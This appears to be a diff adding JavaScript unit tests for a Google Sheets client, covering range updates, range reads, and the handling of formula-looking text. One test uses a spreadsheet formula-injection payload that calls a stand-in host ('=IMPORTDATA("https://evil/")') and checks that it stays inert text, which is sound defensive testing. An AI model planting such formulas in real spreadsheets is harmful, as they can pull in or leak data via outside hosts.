@@ -34,6 +34,40 @@ describe('google client', () => {
     expect(await g.readTab('S1', 'A')).toEqual([['h'], ['1']]);
   });
 
+  it('updateRange writes only the given cells and never clears the tab', async () => {
+    const fake = createFakeGoogle({ S1: { A: [['h1', 'h2', 'h3'], ['a', 'b', 'c'], ['d', 'e', 'f']] } });
+    const g = createGoogle(env, fake.fetch);
+    await g.updateRange('S1', 'A!B3:C3', [['X', 'Y']]);
+    expect(fake.db.S1.A).toEqual([['h1', 'h2', 'h3'], ['a', 'b', 'c'], ['d', 'X', 'Y']]);
+    expect(fake.calls.some((c) => c.path.endsWith(':clear'))).toBe(false);
+    const put = fake.calls.find((c) => c.method === 'PUT');
+    expect(put.path).toBe('/v4/spreadsheets/S1/values/A!B3:C3');
+    expect(put.query).toContain('valueInputOption=USER_ENTERED');
+  });
+
+  it('readRange returns only the requested cells', async () => {
+    const fake = createFakeGoogle({ S1: { A: [['h'], ['a', 'b'], ['c', 'd']] } });
+    const g = createGoogle(env, fake.fetch);
+    expect(await g.readRange('S1', 'A!A3')).toEqual([['c']]);
+    expect(await g.readRange('S1', 'A!A9')).toEqual([]);
+  });
+
+  it('writeTab and updateRange keep formula-looking text as text (Sheets drops the leading \')', async () => {
+    const fake = createFakeGoogle({ S1: { A: [] } });
+    const g = createGoogle(env, fake.fetch);
+    // Texto que já passou pelo Sheets volta sem o ' e é regravado: tem de continuar texto.
+    await g.writeTab('S1', 'A', [['h', 'n'], ['1', '=IMPORTDATA("https://evil/")'], ['2', '+Nova'], ['3', 120]]);
+    expect(fake.db.S1.A[1][1]).toBe('=IMPORTDATA("https://evil/")');
+    expect(fake.isLive('S1', 'A', 1, 1)).toBe(false);
+    expect(fake.isLive('S1', 'A', 2, 1)).toBe(false);
+    expect(fake.db.S1.A[3][1]).toBe('120');
+    await g.updateRange('S1', 'A!B2', [['=1+1']]);
+    expect(fake.isLive('S1', 'A', 1, 1)).toBe(false);
+    await g.appendRow('S1', 'A', ['4', '@x']);
+    expect(fake.db.S1.A[4]).toEqual(['4', '@x']);
+    expect(fake.isLive('S1', 'A', 4, 1)).toBe(false);
+  });
+
   it('appendRow adds one row', async () => {
     const fake = createFakeGoogle({ S1: { A: [['h']] } });
     const g = createGoogle(env, fake.fetch);
